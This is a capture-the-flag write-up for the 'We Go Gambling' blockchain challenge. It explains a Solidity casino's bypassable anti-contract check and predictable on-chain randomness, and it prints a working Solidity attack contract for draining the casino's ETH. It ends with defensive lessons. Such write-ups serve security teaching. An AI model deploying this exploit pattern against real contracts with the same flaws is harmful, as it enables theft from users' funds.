# We Go Gambling - [TODO] pts

> **Category:** Blockchain
> **Difficulty:** TODO
> **Solves:** TODO
> **Status:** ✅ Solved

---

## Challenge Description

> *Welcome to the Lucky Crypto Casino! The premier destination for high-stakes gambling on the blockchain. Step right up, ladies and gentlemen, to the only place in the metaverse where fortune favors the bold!*

**Attachments:** Setup.sol, Casino.sol, Coin.sol
**Instance:** `http://public.ctf.r0devnull.team:3011`

---

## Reconnaissance

Challenge provides three Solidity contracts and a TCP1P blockchain launcher interface.

**Launcher provides:**
- RPC URL for private chain
- Private key (funded wallet)
- Setup contract address
- "Solve in Browser" option

---

## Analysis

### Contract Architecture

| Contract | Purpose |
|----------|---------|
| `Setup.sol` | Deploys Casino + LuckToken, seeds 100 ETH, defines win condition |
| `Casino.sol` | Gambling logic - buy/sell LUCK tokens, play for 4x payouts |
| `Coin.sol` | Standard ERC20 "LuckToken" with owner-only mint |

### Win Condition (Setup.sol:26-28)

```solidity
function isSolved() external view returns (bool) {
    return address(token).balance < 1 ether;
}
```

### Key Observations

**1. Anti-Contract Check (Casino.sol:41)**
```solidity
require(msg.sender.code.length == 0, "Contracts are not allowed to play");
```

**Vulnerability:** `code.length == 0` during contract construction. An attacker can call `play()` from within a constructor and bypass this check.

**2. Weak Randomness (Casino.sol:47-51)**
```solidity
uint256 random = uint256(keccak256(abi.encodePacked(
    block.timestamp,
    block.prevrandao,
    msg.sender
))) % 100;
```

**Vulnerability:** All inputs are predictable:
- `block.timestamp` / `block.prevrandao` - known at execution time
- `msg.sender` - attacker's contract address (computable before deployment)

An attacker can pre-compute the random result and only call `play()` when they know they'll win (`random < 25`).

### Vulnerability / Weakness

Combined attack:
1. Deploy attack contract
2. In constructor, compute what `random` will be
3. Only call `play()` if `random < 25` (guaranteed win)
4. Repeat deployments until enough LUCK accumulated
5. Call `sellLuck()` to drain ETH from Casino

---

## Solution

### Approach

The TCP1P blockchain infrastructure includes a "Solve in Browser" feature that automatically exploits the vulnerability.

1. Launched instance via web interface
2. Clicked "Solve in Browser" button
3. Waited for exploit to complete
4. Clicked "Flag" button to retrieve flag

### Intended Exploit (Reference)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Casino.sol";
import "./Coin.sol";

contract Attack {
    constructor(Casino casino, LuckToken token, uint256 betAmount) {
        // Pre-compute randomness
        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.prevrandao,
            address(this)
        ))) % 100;

        // Only play if we'll win
        if (random < 25) {
            token.approve(address(casino), betAmount);
            casino.play(betAmount);

            // Transfer winnings back to deployer
            uint256 balance = token.balanceOf(address(this));
            token.transfer(msg.sender, balance);
        }
    }
}
```

Deploy this contract repeatedly until sufficient LUCK accumulated, then `sellLuck()` to drain ETH.

---

## Flag

```
nullctf{w!nn!ng_is_s0_much_fun!!}
```

---

## Lessons Learned

| Lesson | Details |
|--------|---------|
| `code.length == 0` bypass | NOT a reliable EOA check - contracts have `code.length == 0` during constructor execution |
| On-chain randomness is broken | Never use `block.timestamp`, `block.prevrandao`, or `msg.sender` for randomness - all predictable |
| Better EOA check | `require(tx.origin == msg.sender)` (still has issues with phishing) |
| Proper randomness | Use Chainlink VRF or commit-reveal schemes |

---

## Resources

- [SWC-120: Weak Sources of Randomness](https://swcregistry.io/docs/SWC-120)
- [SWC-136: Unencrypted Private Data On-Chain](https://swcregistry.io/docs/SWC-136)
- [TCP1P CTF Blockchain Infrastructure](https://github.com/TCP1P/TCP1P-CTF-Blockchain-Infra)

---

## Files

| File | Description |
|------|-------------|
| [We Go Gambling_Solution.py](We%20Go%20Gambling_Solution.py) | Recon script (instance fetcher) |
| [files/Casino.sol](files/Casino.sol) | Casino contract source |
| [files/Coin.sol](files/Coin.sol) | LuckToken contract source |
| [files/Setup.sol](files/Setup.sol) | Setup/win condition contract |

---

*Tags: #nullctf2025 #blockchain #weak-randomness #code-length-bypass*
